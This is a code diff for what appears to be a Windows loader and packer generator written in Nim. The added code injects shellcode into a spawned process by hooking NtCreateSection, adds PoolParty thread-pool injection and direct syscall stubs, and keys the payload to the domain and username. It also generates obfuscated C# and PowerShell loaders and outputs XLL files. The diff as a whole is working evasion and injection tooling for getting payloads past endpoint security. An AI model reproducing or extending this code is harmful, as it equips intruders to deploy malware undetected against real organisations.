+            var status: NTSTATUS = 0
+            var szWritten: SIZE_T = 0
+            
+
+
+            if (buffers != nil):
+                if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
+                    return false
+                copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
+            
+            var protectAddress: LPVOID = addressToHook
+            
+            when defined(Syswhispers):
+                status = uashdiasdj(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_READWRITE,addr dwOldProtect)
+            else:
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):                
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+                status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_READWRITE,addr dwOldProtect)
+
+            if (status == STATUS_SUCCESS):
+                when defined(verbose):
+                    echo obf("[+] NtProtectVirtualMemory RW permissions set for the hook")
+                
+                when defined(Syswhispers):
+                    status = oqiazasusjk(targetProc,addressToHook,addr trampoline[0],dwordSize,addr szWritten)
+                else:
+                    when defined(Hellsgate):
+                        if getSyscall(ntWriteTable):
+                            syscall = ntWriteTable.wSysCall
+                        else:
+                            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+                    status = NtWriteVirtualMemory(targetProc,addressToHook,addr trampoline[0],dwordSize,addr szWritten)
+                if (status == 0):
+                    echo obf("[+] NtWriteVirtualMemory - hook set.")
+                    output = true
+                else:
+                    echo obf("[-] NtWriteVirtualMemory failed: "), toHex(status)
+                    output = false
+            else:
+                echo obf("[-] NtProtectVirtualMemory for the hook failed: "), toHex(status)
+                output = false
+            
+            protectAddress = addressToHook
+            when defined(Syswhispers):
+                status = uashdiasdj(targetProc,unsafeAddr protectAddress,addr protectionLength,PAGE_EXECUTE_READ,addr dwOldProtect)
+            else:
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+                status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_EXECUTE_READ,addr dwOldProtect)
+            
+            if(status != STATUS_SUCCESS):
+                echo obf("[-] NtProtectVirtualMemory to restore page permissions failed")
+            else:
+                echo obf("[+] NtProtectVirtualMemory succeeded, page permissions (RX) restored")
+            
+            
+            status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwordSize)
+            if (status == 0):
+                echo obf("[+] NtFlushInstructionCache success")
+            else:
+                echo obf("[-] NtFlushInstructionCache failed: "), toHex(status)
+            
+            return output
+
+    when defined(ruylopez):
+        proc checkIfInteger(input: string): bool =
+            try:
+                discard parseInt(input)
+                return true
+            except:
+                return false
+
+
+        proc amISpawned(): bool =
+            when defined(lib_only):
+                if(paramCount() >= 2):
+                    if(checkIfInteger(paramStr(2))):
+                        return true
+                    else:
+                        return false
+            else:
+                # if one or more arguments provided return
+                if (paramCount() >= 1):
+                    if(checkIfInteger(paramStr(1))):
+                        return true
+                    else:
+                        when defined(verbose):
+                            echo obf("[*] No input parameters, spawning process...")
+                        return false
+            return false
 
     proc FindPidByName (processName : string):DWORD =
         try:
@@ -2858,6 +3197,7 @@ let NotepadProcIDStub * = fmt"""
     
     # We will re-Use this Handle to avoid using NtOpenProcess again later and it's corresponding Kernel Callback
     var tProcess: HANDLE
+    var treadHandle: HANDLE
     
     proc StartProcess(): void =
         var 
@@ -2866,7 +3206,6 @@ let NotepadProcIDStub * = fmt"""
             ps: SECURITY_ATTRIBUTES
             si: STARTUPINFOEX
             status: WINBOOL
-            tHandle: HANDLE
             tProcPath: WideCString
             ts: SECURITY_ATTRIBUTES
         
@@ -2874,16 +3213,58 @@ let NotepadProcIDStub * = fmt"""
         ts.nLength = sizeof(ts).cint
         si.StartupInfo.cb = sizeof(si).cint
 
+        
+        when defined(localinject):
+            proc getParentProcessId(): int =
+                var hwnd = GetForegroundWindow()
+                var processId: DWORD = 0
+                GetWindowThreadProcessId(hwnd, cast[LPDWORD](addr(processId)))
+                return processId
+            # we will for local execution spawn our own process again and inject the hook into it. SO we need the path for our own (the executing) process, which will be tProcPath
+            #var hModule: HMODULE = GetModuleHandle(nil)
+            #var path: string = newString(1024)
+            #GetModuleFileName(hModule, cast[LPWSTR](addr path[0]), 1024)
+            
+            #let pathString = path[0 .. path.len - 1].cstring()
+            var pathString: string = getAppFilename()
+            when defined(verbose):
+                echo obf("[*] Path to our own process: ") & pathString
+            when defined(logFile):
+                logVerbose(obf("[*] Path to our own process: ") & pathString)
 
-        when defined spoof_args:
-            tProcPath = newWideCString(obf(r"{customspawnprocess}") & " " & obf("{spoofArgs}"))
+            when defined(lib_only):
+                # we need to spawn our own DLL again, so we need to add rundll32.exe to the pathString but also the first argument from our current rundll32.exe process which should be the dll
+                # we also need the full path to the DLL, which means the CWD + the DLL name
+                pathString = pathString & " " & getCurrentDir() & "\\" & paramStr(1)
+            
+            var comandline: string = ""
+            var i = 1
+            
+            while i <= paramCount():
+                when defined(lib_only):
+                    if (i != 1):
+                        # first parameter is rundll32.exe,Funcname (skip that)
+                        comandline = comandline & " " & paramStr(i)
+                else:
+                    comandline = comandline & " " & paramStr(i)
+                inc(i)          
+
+            when defined spoof_args:
+                tProcPath = newWideCString(pathString & " " & $getParentProcessId() & " " & comandline & obf("{spoofArgs}"))
+            else:
+                # add random args, so that it wont spawn itself again
+                tProcPath = newWideCString(pathString & " " & $getParentProcessId() & " " & comandline)
         else:
-            tProcPath = newWideCString(obf(r"{customspawnprocess}"))
+            when defined spoof_args:
+                tProcPath = newWideCString(obf(r"{customspawnprocess}") & " " & obf("{spoofArgs}"))
+            else:
+                tProcPath = newWideCString(obf(r"{customspawnprocess}"))
+
+        InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
+        si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
+        InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
 
         when defined(blockDLLs) or (obf("{parentProcess}") != ""):
-            InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
-            si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
-            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
 
             when defined(blockDLLs):
                 const
@@ -2927,12 +3308,9 @@ let NotepadProcIDStub * = fmt"""
         
         when defined(suspended): 
             flags = flags or CREATE_SUSPENDED
-        
+        #[
         if(cfgspawn): # for some reasson CFG kicks in, when we execute threadlessinject style into a newly spawned process
             
-            InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
-            si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
-            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
             var policy: DWORD64
             const PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF = 0x00000002 shl 40
             policy = PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF
@@ -2946,7 +3324,7 @@ let NotepadProcIDStub * = fmt"""
                 sizeof(policy),
                 NULL,
                 NULL)
-            
+        ]#  
 
         status = CreateProcess(
             NULL,
@@ -2959,117 +3337,187 @@ let NotepadProcIDStub * = fmt"""
             r"C:\Windows\system32\",
             addr si.StartupInfo,
             addr pi)
-
+        
         tProcess = pi.hProcess
         remoteProcID = pi.dwProcessId
-        tHandle = pi.hThread
+        treadHandle = pi.hThread
+        
+        when defined(verbose):
+            echo obf("[*] CreateProcess: "), status
+            if (status == 0):
+                echo obf("    \\-- Error: "), GetlastError()
 
-    StartProcess()
+        
+
+    # when defined libonly and more than two argument provided return, we already got spawned again for ruy-lopez and dont want to end up in a loop
+    when defined(localinject):
+        if(not amISpawned()):
+            when defined(verbose):
+                echo obf("[*] Spawning process...")
+            StartProcess()
+        else:
+            when defined(verbose):
+                echo obf("[*] We are already spawned, continue...")
+            
+    else:
+        StartProcess()
 
     when defined(ruylopez):
 
-        var ntdll: LibHandle = loadLib(obf("ntdll"))
+        if (amISpawned() == false):
 
-        var ntCreateSectionHandle: pointer = ntdll.symAddr(obf("NtCreateSection")) # equivalent of GetProcAddress()
-        
-        when defined(verbose):
-            echo obf("[*] Injecting Shellcode for the hook into the remote process: "), remoteProcID
+            var ntdll: LibHandle = loadLib(obf("ntdll"))
 
-        const hookShellcode = slurp"ruylopez.bin"
-
-        var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
-
-        # Allocate memory in which the Shellcode will be written later on after restoring the original NtCreateSection bytes
-
-        var rPtr: LPVOID
-        var status: NTSTATUS
-        var sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)
-
-        status = NtAllocateVirtualMemory(
-            tProcess, &rPtr, 0, &sc_size, 
-            MEM_COMMIT, 
-            PAGE_EXECUTE_READWRITE);
-
-        when defined(verbose):
-            if(status == 0):
-                echo obf("[+] NtAllocateVirtualMemory success!")
-            else:
-                echo obf("[-] NtAllocateVirtualMemory failed!")
-                quit(1)
-
-        when defined(verbose):
-            if(rPtr != nil):
-                echo obf("[+] Successfully allocated remote process memory for the shellcode")
-            else:
-                echo obf("[-] Memory allocation for remote process failed!")
-                quit(1)
-
-        var buffers: HookTrampolineBuffers
-
-        var addressToHook: LPVOID = cast[LPVOID](ntCreateSectionHandle)
-        ntCreate_Address = cast[HANDLE](ntCreateSectionHandle)
-        var output: bool = false
-
-        if (ntCreate_Address == 0):
-            quit(1)
+            var ntCreateSectionHandle: pointer = ntdll.symAddr(obf("NtCreateSection")) # equivalent of GetProcAddress()
             
-        buffers.previousBytes = cast[HANDLE](ntCreate_Address)
-        buffers.previousBytesSize = DWORD(sizeof(ntCreate_Address))
-        g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
-        var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
-        copyMem(PointerToOrigBytes, addressToHook, 24)
-        
-        when defined(verbose):
-            echo obf("[*] Writing allocated Shellcode address "), repr(rPtr), obf(" into Original NtCreateSection address as hook: ")
+            when defined(verbose):
+                echo obf("[*] Injecting Shellcode for the hook into the remote process: "), remoteProcID
 
-        output = fastTrampoline(tProcess, cast[LPVOID](addressToHook), rPtr, &buffers)
+            const hookShellcode = slurp"ruylopez.bin"
 
-        when defined(verbose):
-            if(output):
-                echo obf("[+] Remotely Hooked NtCreateSection: "), output
+            var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
+
+            # Allocate memory in which the Shellcode will be written later on after restoring the original NtCreateSection bytes
+
+            var rPtr: LPVOID
+            var status: NTSTATUS
+            var sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)
+            
+            when defined(Syswhispers):
+                status = oqiahsjynmxkla(tProcess, &rPtr, 0, &sc_size, MEM_COMMIT, PAGE_READWRITE)
             else:
-                echo obf("[-] Remote Hook failed!")
+                when defined(Hellsgate):
+                    if getSyscall(ntAllocTable):
+                        syscall = ntAllocTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+
+                status = NtAllocateVirtualMemory(
+                    tProcess, &rPtr, 0, &sc_size, 
+                    MEM_COMMIT, 
+                    PAGE_READWRITE);
+
+            when defined(verbose):
+                if(status == 0):
+                    echo obf("[+] NtAllocateVirtualMemory success!")
+                else:
+                    echo obf("[-] NtAllocateVirtualMemory failed!")
+                    quit(1)
+
+            when defined(verbose):
+                if(rPtr != nil):
+                    echo obf("[+] Successfully allocated remote process memory for the shellcode")
+                else:
+                    echo obf("[-] Memory allocation for remote process failed!")
+                    quit(1)
+
+            var buffers: HookTrampolineBuffers
+
+            var addressToHook: LPVOID = cast[LPVOID](ntCreateSectionHandle)
+            ntCreate_Address = cast[HANDLE](ntCreateSectionHandle)
+            var output: bool = false
+
+            if (ntCreate_Address == 0):
                 quit(1)
+                
+            buffers.previousBytes = cast[HANDLE](ntCreate_Address)
+            buffers.previousBytesSize = DWORD(sizeof(ntCreate_Address))
+            g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
+            var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
+            copyMem(PointerToOrigBytes, addressToHook, 24)
+            
+            when defined(verbose):
+                echo obf("[*] Writing allocated Shellcode address "), repr(rPtr), obf(" into Original NtCreateSection address as hook: ")
+
+            output = fastTrampoline(tProcess, cast[LPVOID](addressToHook), rPtr, &buffers)
+
+            when defined(verbose):
+                if(output):
+                    echo obf("[+] Remotely Hooked NtCreateSection: "), output
+                else:
+                    echo obf("[-] Remote Hook failed!")
+                    quit(1)
 
 
-        # We need to restore the original bytes into our shellcode egg, so that the Shellcode itself can restore the original NtCreateSection later on.
-        # To do that, we need to find the egg in the Shellcode and replace it with the original bytes.
-        when defined(verbose):
-            echo obf("[*] Searching for egg in the shellcode...")
+            # We need to restore the original bytes into our shellcode egg, so that the Shellcode itself can restore the original NtCreateSection later on.
+            # To do that, we need to find the egg in the Shellcode and replace it with the original bytes.
+            when defined(verbose):
+                echo obf("[*] Searching for egg in the shellcode...")
 
-        var eggIndex = 0
-        for i in 0 ..< hookShellcodeBytes.len:
-            if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0xBE) and (hookShellcodeBytes[i+3] == 0xEF) and (hookShellcodeBytes[i+4] == 0x13) and (hookShellcodeBytes[i+5] == 0x37):
+            var eggIndex = 0
+            for i in 0 ..< hookShellcodeBytes.len:
+                if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0xBE) and (hookShellcodeBytes[i+3] == 0xEF) and (hookShellcodeBytes[i+4] == 0x13) and (hookShellcodeBytes[i+5] == 0x37):
+                    when defined(verbose):
+                        echo obf("[+] Found egg at index: "), i
+                    eggIndex = i
+                    break
+
+            # Write the original bytes into the egg
+            when defined(verbose):
+                echo obf("[*] Modifying shellcode to add original NtCreateSection bytes")
+            copyMem(unsafeAddr hookShellcodeBytes[eggIndex], PointerToOrigBytes, 24)
+            when defined(verbose):
+                echo obf("[*] Done.")
+
+            # Finally write the shellcode into the remote process
+            var bytesWritten: SIZE_T
+            
+            when defined(Syswhispers):
+                status = oqiazasusjk(tProcess, rPtr, unsafeAddr hookShellcodeBytes[0], sc_size-1, addr bytesWritten)
+            else:
+                when defined(Hellsgate):
+                    if getSyscall(ntWriteTable):
+                        syscall = ntWriteTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                status = NtWriteVirtualMemory(
+                        tProcess, 
+                        rPtr, 
+                        unsafeAddr hookShellcodeBytes[0], 
+                        sc_size-1, 
+                        addr bytesWritten);
+
+            when defined(verbose):
+                if (status == 0):
+                    echo obf("[+] NtWriteVirtualMemory: "), status
+                    echo obf("    \\-- bytes written: "), bytesWritten
+                    echo ""
+                else:
+                    echo obf("[-] NtWriteVirtualMemory failed!")
+                    quit(1)
+            
+            # re-protect memory to RX
+            
+            var protectRXAddress: LPVOID = rPtr
+            var rxOldProtect: DWORD = 0
+            when defined(Syswhispers):
+                status = uashdiasdj(tProcess,unsafeAddr protectRXAddress,addr sc_size,PAGE_EXECUTE_READ,addr rxOldProtect)
+            else:                
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                status = NtProtectVirtualMemory(tProcess,unsafeAddr protectRXAddress,addr sc_size,PAGE_EXECUTE_READ,addr rxOldProtect)
+
+            if(status == 0):
                 when defined(verbose):
-                    echo obf("[+] Found egg at index: "), i
-                eggIndex = i
-                break
-
-        # Write the original bytes into the egg
-        when defined(verbose):
-            echo obf("[*] Modifying shellcode to add original NtCreateSection bytes")
-        copyMem(unsafeAddr hookShellcodeBytes[eggIndex], PointerToOrigBytes, 24)
-        when defined(verbose):
-            echo obf("[*] Done.")
-
-        # Finally write the shellcode into the remote process
-        var bytesWritten: SIZE_T
-
-        status = NtWriteVirtualMemory(
-                tProcess, 
-                rPtr, 
-                unsafeAddr hookShellcodeBytes[0], 
-                sc_size-1, 
-                addr bytesWritten);
-
-        when defined(verbose):
-            if (status == 0):
-                echo obf("[+] NtWriteVirtualMemory: "), status
-                echo obf("    \\-- bytes written: "), bytesWritten
-                echo ""
+                    echo obf("[+] NtProtectVirtualMemory succeeded, page permissions (RX) restored")
             else:
-                echo obf("[-] NtWriteVirtualMemory failed!")
+                when defined(verbose):
+                    echo obf("[-] NtProtectVirtualMemory to restore page permissions failed")
                 quit(1)
+    when defined(ruylopez):
+        when defined(localinject):
+            if(not amISpawned()):
+                # resume main thread for execution
+                ResumeThread(treadHandle)
+                # Wait for the thread to finish
+                WaitForSingleObject(treadHandle, INFINITE)
+                when defined(verbose):
+                    echo obf("[*] Quit main process...")
+                quit(1)
+
 
     when defined(verbose):
         echo obf("[*] Sleeping in between for: "), {sleepinbetween}
@@ -3177,10 +3625,40 @@ proc CreatedInterrupt(): bool =
         return true
 """
 
+let DomainKeyStub * = """
+
+envkey = getDomain()
+envkey2 = envkey.toLower() # lowercase to avoid issues with case sensitivity
+when defined(verbose):
+    echo obf("[*] Domain for the key: "), envkey2
+
+
+"""
+
+let UsernameKeyStub * = """
+
+when defined(environmentalDomain):
+    # concatenate the Username to existing envkey2 value as we enumerate both
+    envkey = envkey & getUsername()
+    envkey2 = envkey
+else:
+    envkey = getUsername()
+    envkey2 = envkey
+
+envkey = envkey.toLower() # lowercase to avoid issues with case sensitivity
+
+when defined(verbose):
+    echo obf("[*] Final Key: "), envkey2
+"""
+
+
 var stub = Cryptstub1
 if(macPayload):
     stub.add(macPayloadStub)
 stub.add(Cryptstub15)
+
+if (usepoolparty):
+    stub.add(PoolpartyTypeDefs)
 
 if (not noDInvoke):
     stub.add(DInvokeStubfirst)
@@ -3215,9 +3693,12 @@ stub.add(getRandStubNoTab())
 
 if(sandbox):
     if (not noDInvoke): stub.add(DInvokeSandBoxStub)
+    if(environmentalDomain):
+        stub.add(DomainCheckStub)
     for m in sandboxchecks:
         if(m == "Domain"):
-            stub.add(DomainCheckStub)
+            if (not environmentalDomain): # if we already added it, we don't want to add it again
+                stub.add(DomainCheckStub)
             stub.add(DomainCheckStub1)
         if (m == "DiskSpace"):
             stub.add(DiskSpaceStub)
@@ -3229,6 +3710,13 @@ if(sandbox):
             stub.add(VirtualAlloxExNumaCheckStub)
         if (m == "WindowChanges"):
             stub.add(WindowChangeStub)
+else:
+    if (not noDInvoke): stub.add(DInvokeSandBoxStub)
+    if(environmentalDomain):
+        stub.add(DomainCheckStub)
+    if(environmentalUsername):
+        stub.add(UserNameCheckStub)
+
 if (apihide):
     stub.add(APIHideStub)
 
@@ -3244,6 +3732,11 @@ if(gosleep or remoteETWpatch or remoteAMSIpatch):
 
 stub.add(getRandStubNoTab())
 
+
+if(environmentalDomain):
+    stub.add(DomainKeyStub)
+if(environmentalUsername):
+    stub.add(UsernameKeyStub)
 
 if (syswhispers):
     if(jump):
@@ -3265,6 +3758,11 @@ if(hellsgate):
     stub.add(HellsgateNtCloseDelegate)
     stub.add(HellsgateNtReadVirtualMemoryDelegate)
     stub.add(HellsgateNtFreeVirtualMemoryDelegate)
+    # if use poolparty add hellsgate poolparty stubs
+    if (usepoolparty):
+        stub.add(HellsgateZwAssociateWaitCompletionPacketDelegate)
+        stub.add(HellsgateNtSetInformationWorkerFactoryDelegate)
+        stub.add(HellsgateZwSetIoCompletionDelegate)
     if(remoteMapSection):
         stub.add(HellsgateNtMapViewOfSectionDelegate)
         stub.add(HellsgateNtCreateSectionDelegate)
@@ -3274,6 +3772,7 @@ if(hellsgate):
         stub.add(HellsgateNtCreateThreadExDelegate)
     if(not localinject or remoteETWpatch or remoteAMSIpatch):
         stub.add(HellsgateNtOpenProcessDelegate)
+        stub.add(HellsgateNtDuplicateObjectDelegate)
         stub.add(HellsgateNtCreateThreadExDelegate)
     if(localinject and useQueueAPC):
         stub.add(HellsgateNtTestAlertDelegate)
@@ -3315,8 +3814,13 @@ stub.add(MainStub)
 
 stub.add(getRandStub())
 
+
 if(getfreshstub):
     stub.add(RetrieveSyscallStubs)
+
+# if ruy-lopez and localinject or csharp/peload add NotepadProcIDStub
+if(ruylopez and (localinject or csharp or peload)):
+    stub.add(NotepadProcIDStub)
 
 if(unhook):
     if(hellsgate):
@@ -3328,7 +3832,7 @@ if(unhook):
     elif(syswhispers):
         if (not noDInvoke):
             stub.add(DInvokeUnhookStubs)
-    stub.add(UnhookNtdllStub)
+    stub.add(UnhookStub)
 
 stub.add(getRandStub())
 
@@ -3359,6 +3863,11 @@ if(dripallocate):
 if (selfdelete):
     stub.add(FileDeleteStub)
 stub.add(getRandStub())
+
+# if poolparty add PoolpartyExecute
+if (usepoolparty):
+    stub.add(PoolpartyExecute)
+
 if (localinject):
     if(AMSI):
         stub.add(AMSIStub)
@@ -3521,11 +4030,11 @@ if (shellcode):
             stub.add(ShellcoderemoteinjectStub)
         stub.add(getRandStub())
 
-if(dll_out or cpl):
+if(dll_out or cpl or xll):
     if ((hide == false) and (apiHide == false)):
         stub.add(DLLNoHideStub)
 
-if (csharp):
+if (csharp and not peinject):
     stub.add(getRandStub())
     if (noArgs):
         stub.add(LoadAssemblyStub)
@@ -3547,7 +4056,7 @@ if (sleepycrypt):
     stub.add(LocalInjectGetSyscallStubSleepStub)
     #stub.add(SleepyCryptLoopExecute)
 
-if(dll_out or cpl):
+if(dll_out or cpl or xll):
     if (dllProxy):
         stub.add(DLLProxyStub)
     else:
@@ -3648,7 +4157,10 @@ else:
 if(customKey):
     basicCompileFlags.add("-d:customKey ")
 
-if(usekeyFile or usednsKey or webKey):
+if(environmentalDomain):
+    basicCompileFlags.add("-d:environmentalDomain ")
+
+if(usekeyFile or usednsKey or webKey or environmentalDomain or environmentalUsername):
     basicCompileFlags.add("-d:noKey ")
     if(useKeyFile):
         basicCompileFlags.add("-d:keyFromFile ")
@@ -3656,6 +4168,8 @@ if(usekeyFile or usednsKey or webKey):
         basicCompileFlags.add("-d:dnsKey ")
     elif(webKey):
         basicCompileFlags.add("-d:webKey ")
+    elif(environmentalDomain or environmentalUsername):
+        basicCompileFlags.add("-d:environmentalKey ")
 
 if(stomb):
     basicCompileFlags.add("-d:stomb ")
@@ -3681,10 +4195,14 @@ if(useStego):
 if(macPayload):
     basicCompileFlags.add("-d:macPayload ")
 
+# if dllNames contains clr.dll, add -d:unhookclr
+if (dllNames.contains("clr.dll")):
+    basicCompileFlags.add("-d:unhookclr ")
+
 if(unhook):
     basicCompileFlags.add("-d:unhook ")
 
-if(psout):
+if(psout or csout):
     basicCompileFlags.add("-d:powershell ")
 
 if(useQueueAPC):
@@ -3730,6 +4248,10 @@ if(unhook):
 
 if(threadless):
     basicCompileFlags.add("-d:threadless ")
+
+if(usepoolparty):
+    basicCompileFlags.add("-d:poolparty ")
+    basicCompileFlags.add(fmt"-d:variant{poolparty} ")
 
 if(dllProxy):
     when system.hostOS == "windows":
@@ -3810,7 +4332,7 @@ if (big):
     basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
 
 if (metadata and (not compileX86)): # compiled .o files only work for x64, didnt compile for x86 so far
-    if (dll_out or cpl):
+    if (dll_out or cpl or xll):
         when system.hostOS == "windows":
             basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\dll.o ")
         else:
@@ -3830,6 +4352,9 @@ if (compileX86):
 if (wow64):
     basicCompileFlags.add("-d:wow64 ")
 
+if(xll):
+    basicCompileFlags.add("-d:xll ")
+
 if not noDInvoke:
     basicCompileFlags.add("-d:DInvoke ")
 
@@ -3842,7 +4367,7 @@ if (sleepinbetween > 0):
 if localCreateThread:
     basicCompileFlags.add("-d:LocalCreateThread ")
 
-if (dll_out or cpl):
+if (dll_out or cpl or xll):
     #if (processname == ""): # Why did I do that? It make no sense.
     #    basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
     #else:
@@ -3881,8 +4406,8 @@ echo basicCompileFlags
 echo "\n\n"
 
 if(sourceonly):
-    if(psout or dllproxy or denim or replace or dllclone):
-        echo "[!] You specified one of psout, dllproxy, dllclone, denim or replace. That has to be done by yourself as you also specified sourceonly."
+    if(psout or dllproxy or denim or replace or dllclone or csout):
+        echo "[!] You specified one of psout, csout, dllproxy, dllclone, denim or replace. That has to be done by yourself as you also specified sourceonly."
     quit()
 
 when system.hostOS == "windows":
@@ -4019,9 +4544,52 @@ proc WritePS1() =
 
         writeFile(fmt"{outfile}.ps1", script)
     else:
-        echo fmt"[!] File {outfile}.ps1 not found, skipping byte list creation"
+        echo fmt"[!] File {outfile} not found, skipping byte list creation"
 
 
+# we need a function here, that takes the output file and retrieves a list of all bytes from it separated with a "," and then replaces the egg string QWERQWERQWER in the loader.cs file of the current directory
+proc WriteCS() =
+    var exists: bool = true
+    try:
+        var fileCheck = readFile(fmt"{outfile}")
+    except:
+        exists = false
+    if(exists):
+        var file = open(fmt"{outfile}", fmRead)
+        var bytes: seq[byte] = toByteSeq(file.readAll())
+        file.close()
+        var length: int = len(bytes) - 1
+        var byteList: string = ""
+        for i in 0..length:
+            byteList.add(fmt"{bytes[i]},")
+        byteList = byteList[0..^2]
+        var script: string = CStemplate
+        script = script.replace("QWERQWERQWER", byteList)
+        writeFile(fmt"{outfile}.cs", script)
+        echo fmt"[!] Loader saved to {outfile}.cs"
+        # Read Packer.csproj and replace TOREPLACE.cs with the new filename
+        var exists: bool = true
+        try:
+            var fileCheck = readFile(fmt"{packerPath}\cstemplate")
+        except:
+            exists = false
+        if(exists):
+            var file = open(fmt"{packerPath}\cstemplate", fmRead)
+            var filecontent: string = file.readAll()
+            file.close()
+            filecontent = filecontent.replace("TOREPLACE.cs", fmt"{outfile}.cs")
+            writeFile(fmt"{packerPath}\Packer.csproj", filecontent)
+            echo fmt"[!] Packer.csproj saved to {packerPath}\Packer.csproj"
+        else:
+            echo fmt"[!] File {packerPath}\cstemplate not found, skipping replacement of TOREPLACE.cs"
+
+        # Print, that this can be compiled with csc.exe but add the unsafe code option. Give the exact command to compile it.
+        echo "\r\n"
+        echo fmt"[!] You can compile the C# Loader with the following command:"
+        echo fmt"dotnet build --configuration Release Packer.csproj"
+
+    else:
+        echo fmt"[!] File {outfile} not found, skipping byte list creation"
 
 if(replace):
     replaceList()
@@ -4049,7 +4617,7 @@ if(exists):
     let msg = fmt"[!] Loader saved to {outfile}"
     echo "\n" & msg
     if(retrieveFromFile):
-        echo fmt"[!] Encrypted Payload saved to {shellcodeFile[0]}"
+        echo fmt"[!] Encrypted Payload saved to {outStringShellcode}"
     if (callobfs):
         when system.hostOS == "windows":
             var outfileonlyname = outfile.replace(packerPath, "")
@@ -4067,6 +4635,8 @@ if(exists):
         var extension: string = ".exe"
         if (cpl):
             extension = ".cpl"
+        elif (xll):
+            extension = ".xll"
         elif(dll_out):
             extension = ".dll"
         if system.hostOS == "linux":
@@ -4094,15 +4664,62 @@ if(exists):
                 writeFile(fmt"{outfile}",pumpsequence)
 
     if (retrieveFromURL):
-        echo fmt"[!] Make sure to host the {shellcodeFile[0]} file on your webserver with the correct filename to have a working payload ;-)"
+        echo fmt"[!] Make sure to host the {outStringShellcode} file on your webserver with the correct filename to have a working payload ;-)"
 
     if (dllProxy):
         echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
+    
+    if(scout):
+        # Use donut again but this time with the outfile as input
+        echo "[*] Using Donut to generate a shellcode from the binary"
+        if system.hostOS == "linux":
+            discard os.execShellCmd(fmt"{packerPath}/donut/donut --input:{outfile} -o {outfile}.bin -b 1 -z 1")
+        when system.hostOS == "windows":
+            discard os.execShellCmd(fmt"{packerPath}\donut\donut.exe --input:{outfile} -o {outfile}.bin -b 1 -z 1")
+        echo "\r\n\r\n" & fmt"[!] Shellcode saved as {outfile}.bin"
+
+    
+    if(csout):
+        WriteCS()
+        if(psout):
+            # Compile the C# Loader with dotnet build --configuration Release Packer.csproj via os.execShellCmd
+            echo "\r\n"
+            discard os.execShellCmd(fmt"dotnet build --configuration Release Packer.csproj")
+            echo "\r\n"
+            # get the bytes from the release file and replace the egg QWERQWERQWER in the script.ps1 file with the binary representation of the bytes, not seperated. Only 1 and 0 should be in it. like $var = "011010100101"
+            # the compiled binary is under packerpath\bin\Release\net462\Packer.exe
+            var file = open(fmt"{packerPath}\bin\Release\net462\Packer.exe", fmRead)
+            var bytes: seq[byte] = toByteSeq(file.readAll())
+            file.close()
+            var length: int = len(bytes) - 1
+            var byteList: string = ""
+            for i in 0..length:
+                byteList.add(fmt"{bytes[i]}_")
+            byteList = byteList[0..^2]
+            var script: string = CSPSTemplate
+            script = script.replace("QWERQWER", byteList)
+            # Replace the following variables with random Variable names: PEstring, Pummel,byteValues, pestring, byteArray, byteValues, RAS, Entry, Zack. "_" should be replaced with a random value out of #+~*§%&/()=?<>
+            var words: seq[string] = @["PEstring", "Pummel", "byteValues", "byteArray", "byteValues", "RAS", "Zack", "_"]
+            var randSpecial: seq[string] = @["#", "+", "~", "*", "§", "%", "&", "/", "=", "?", "<", ">"]
+            var wordlength: int = len(words) - 1
+            for i in 0..wordlength:
+                var randstring: string
+                if (words[i] == "_"):
+                    randstring = randSpecial[rand(0..11)]
+                else:
+                    randstring = rndStr(rand(3..10))
+                    
+                #echo "Replacing " & fmt"{words[i]}" & " with " & randstring
+                script = script.replace(fmt"{words[i]}", randstring)
